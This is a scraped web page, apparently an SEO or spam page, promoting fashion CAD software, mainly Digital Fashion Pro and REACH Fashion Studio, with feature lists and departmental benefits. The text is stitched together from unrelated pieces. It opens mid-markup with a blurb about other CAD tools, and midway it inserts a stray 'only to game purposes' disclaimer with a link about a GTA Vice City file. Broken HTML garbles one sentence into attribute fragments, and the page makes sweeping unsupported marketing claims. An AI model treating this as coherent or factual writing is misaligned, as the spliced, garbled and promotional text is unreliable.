It</span></strong></span></div><div><span>. </span></div><p>(17 reviews) Save. An easy-to-use cloud-based PLM. 3D-Crafter is a free design software developed by Amabilis Software. It is an intuitive CAD program, thanks to its drag and drop approach. It will enable you to create drawings and animating 3D objects. Easy to learn FREE CAD software with common part templates, manufacturability analysis, and instant production pricing. Open DWG, DXF, IGES, STEP, and STL.</p><div><span>Fashion CAD is where the fashion world is at when it comes to fashion illustrations. All fashion labels employ at least one designer on staff that knows how to use Fashion CAD. Why is using Fashion CAD important? It is important because it allows fashion designers to better manage their workflow, similarity in scale of the company’s designs, and better translation when it comes to getting the designs made. Fashion Designers who use Fashion CAD also can easily share their designs with others inside the company and with manufacturers etc. Fashion CAD has been around for years and have been taught along with hand sketching in fashion schools for years. However, greater emphasis is now placed on learning Fashion CAD in schools than in years of the past. This greater emphasis can mainly be attributed to the change in technology and the fact that more fashion employers want to hire fashion graduates who can use Fashion CAD.</span></div><div><span>.</span></div><div><span>Apparel manufacturers like to receive computer generated sketches as well. Most hate to work with hand sketches. Many new designers make the mistake of sending hand sketches to garment manufacturers. Most don’t like them. Some might even tolerate for awhile but then at some point they will request that you convert your sketches. Apparel manufacturers can better duplicate your designs when they are presented as computer generated fashion sketches. As a designer you will love that fact when your design samples come back looking closer to what you envisioned. This is just one more reason why <span>Fashion CAD</span> is absolutely necessary! </span></div><div><span>.</span></div><div><span>Fashion CAD makes life easy for fashion designers. Why should a fashion designer keep drawing the same silhouette over and over? Fashion CAD like <span><strong>Digital Fashion Pro</strong></span> solves that problem and more. It only makes sense that if you can start out with a silhouette template that you use often would help you focus on the actual design detail rather than having to always start by drawing the silhouette to begin. This saves designers time and allows them to be even more productive. However is must also be said that the fashion design program I was referring to (Digital Fashion Pro) is much more than a Fashion CAD. It is a true fashion design system that comes with fashion templates, training, graphics program an more wrapped in one. This is one of the things that separates Digital Fashion Pro from other Fashion CAD programs on the market. Plus it’s easy to learn.</span></div><div><span>.</span></div><img src='https://i.ytimg.com/vi/6jSOLv9Q6Hg/maxresdefault.jpg' alt='Cad' title='Cad'><div><span>So what about the person who wants to start designing clothes but can’t draw. Well, before Digital Fashion Pro, these people would have to either have other people design for them, scribble things out or just leave their fashion ideas rotting in their heads. Digital Fashion Pro helps people who can’t draw as well create professional fashion sketches. That’s right! No one is left out when it comes to Digital Fashion Pro. This is one Fashion CAD that has something for everyone. Fashion CAD as I mentioned even to those that can draw. No matter what, all fashion designers should at least have one Fashion CAD in their arsenal.</span></div><div><span>.</span></div><p reveal-fx='RevealFX2'> Best In Class software for Fashion Design<br> Give Wings to Your Creativity </p><video controls='> Your browser does not support HTML5 video. </video><p>REACH Fashion Studio</p><h2>What does REACH Fashion Studio do?</h2><div><span>Previous</span><span>Next</span></div><p><br /><b>Design &amp; Repeat :</b> This textile and surface designing tool can create all types of repeats. This includes converting design into horizontal or vertical repeats and many more. Any changes take place immediately over multiple repeats.<br /><b>Fabric Design :</b> Fabric design creativity can be quickly translated into reality. It allows the designer to scan, import or create any kind of fabric from dobby, knit or leather fabrics in the software itself with real texture effects.<br /><b>Spec. Creation :</b> With Spec. Creation the user is able to ensure product information integrity. Specifications can be detailed in order to achieve the best possible manufacturing sample early on. Blocks of technical drawings can be stored and later re-combined to make new designs. </p><p> REACH Fashion Studio is the multipurpose software for design, sales, sampling and printing departments. Packed with features REACH Fashion Studio enables 3D product visualization, texture mapping, color reduction and cleaning, design and repeat, colorways, color communication using REACH and Spec. Creation.<br /><b>3D Product Visualization :</b> Create designs in an entirely digital environment, thereby shortening the design cycle. This feature enables photo-realistic 3D rendering of designs, colors, surfaces, textures and patterns.<br /><b>Texture Mapping :</b> Preliminary ideas can be directly scanned on to the software and then manipulated all within the application. Utilizing simple and intuitive tools, Texture Mapping offers the opportunity to preview designs, on a model or in real life. More so, the materials and fabrics used in the design will act exactly as they would if they were real.<br /><b>Color Reduction :</b> Starting with either a scanned picture, fabric, or an imported picture file format, you can precisely reduce millions of pixels down to just the color you specify. REACH Fashion Studio features an advanced color separation function which helps the designer quickly judge the color separation.<br /><b>Colorways :</b> Easily create your season' s="" palettes="" and="" then="" simply="" drag="" and="" drop="" into="" place.="" you="" can="" drag="" colors="" from="" multiple="" palettes="" to="" the="" design,="" drag="" between="" designs,="" the="" possibilities="" are="" endless!="" you="" can="" also="" automatically="" make="" as="" many="" colorways="" on="" the="" screen="" as="" you="" like,="" making="" it="" easy="" to="" compare="" and="" reserve="" for="" later=""></video><br><b>Color Communication :</b> With a single click it is possible to find the nearest REACH shade of any color scanned, or imported. Colors can be personalized using RGB, CMYK and Hue , Lighting and Saturation by mixing or entering the values.<br><p><h2>Benefits of using REACH Fashion Studio</h2><h2>Industry</h2><p> If you an organization in the fashion, garment, clothing, apparel, textile or related sectors, REACH Fashion Studio will save you money,time and hassle. <br> REACH Fashion Studio benefits include <br></p><img src='https://digitalfashionpro.com/wp-content/uploads/2018/08/technical-garment-sketch-line-sheet-apparel-2-1150.png' alt='Free clothing design software' title='Free clothing design software'><h5>Benefits for the Designing Department</h5><p> Increased creativity and productivity.<br> The design cycle time is dramatically reduced.<br> Designers are able to manage style effectively, in turn minimizing communication and production problems.<br> Recognizing the realistic, on-screen representation of color within a design is vital to the design process, a major asset of Fashion studio is its ability to create color and generate colorways. User can create personalized RGB and CMYK color libraries. Colors, from any of these user-defined color libraries, can either be mixed individually within the design or imported from imbedded color libraries, i.e. REACH.<br> The designer can allocate colors from color libraries automatically throughout the entire design in a matter of seconds, and add them to the file variation library where the various color ways are stored.<br> Enables designers to create drafts quickly and easily - from the preliminary sketch, through necessary revisions, to the final adopted style. This can also include the creation of storyboard presentations.<br> Texture Mapping - Digitally represents the surface of a two-dimensional object as a three-dimensional object. The display of color, brightness and texture is encoded with three-dimensional properties, such as how transparent and reflective the object is. It can be applied to a linear sketch or a photograph.<br> A useful and practical tool that can be used at an internal level within the company itself, improving communication between creation, commercialization and production without using the samples prepared in the production machines.<br> Simulation systems provide clear advantages by optimizing the processes of creation and production.<br> Saving items to libraries eliminates the need to repeat the work at a later stage.<br> A wide range of effects are available, this includes natural wrinkle creation and create shadow at edge of surface.<br></p><h5>Benefits for the Sales and Marketing Department</h5><p> The high costs incurred through the development of prototypes and preparation of catalogues are avoided. Considerable reduction in time as the preparation of prototypes and catalogues is avoided. Present the product to clients in a number of style combinations, all in life-like 3D view to add professionalism and highlight key attributes. Presentation can be sent in seconds, and received anywhere around the world almost instantly.<br> The three-dimensional simulation system uses the simulation of the fabric in order to present it on its natural setting. A virtual catalogue can be prepared with thousands of proposals without having to invest either on fabrics or on the development of models and prototypes.<br></p><p>The substance and words utilized as a part of this posts are only to game purposes and ought not by any methods utilized as a part of genuine living. <a href='/gta-vice-city-file-for-ppsspp.html' title='Gta vice city file for ppsspp'>Gta vice city file for ppsspp</a>.

Color is something very important in printed fabrics. A sketch with an adequate composition may not be attractive if the colors are not adequate, and nevertheless a sketch with a defective composition may be attractive if the colors are well combined.<br> The proposals for color combinations are generally materialized on paper, at full size and in repetition, so that they can be evaluated (valued, criticized..) by the sales department before going on to the next step of production, thus obtaining important feedback. REACH color cards supports over 15,000 REACH colors. Auto matching defined color with similar REACH color showing REACH color code; Search REACH color by color name.<br></p><h5>Benefits for the Sampling &amp; Production Department</h5><p> Decision-making on design, pre-production and even pre-sampling based on 3D views is enabled. The process of sampling is sped up or can be avoided altogether. By detailing specifications consistent product information along with the best possible manufacturing is ensured. By sending files electronically details can be viewed in full color with sharp text and graphics to a standard much higher than that of a fax printout.<br> Time and raw materials are also saved during the study of the collection or sampling. Communication and networking between various departments is facilitated. The fabric simulation system, which turns the computer into a virtual loom, obtains the simulation of the fabric either on the screen or on paper by means of a printer, with total realism.<br> Technical Design - Pattern making must be achieved with the correct technical specifications for the most accurate fit. This is normally achieved by the technical 'style' drawing that conveys the look of the apparel garment along with key manufacturing parameters. Duplication of image content is avoided. </p><h2>Professionals</h2><h3 id='fashion-3d-software'>Fashion 3d Software</h3><p> If you are a professional, getting trained on REACH Fashion Studio will enable you access opportunities in the digital fashion value chain and accelerate your professional growth.<br> Online and Onsite Training Programmes on REACH Fashion Studio are available through a range of institutions including universities,polytechnics, technical schools and skill training centres.
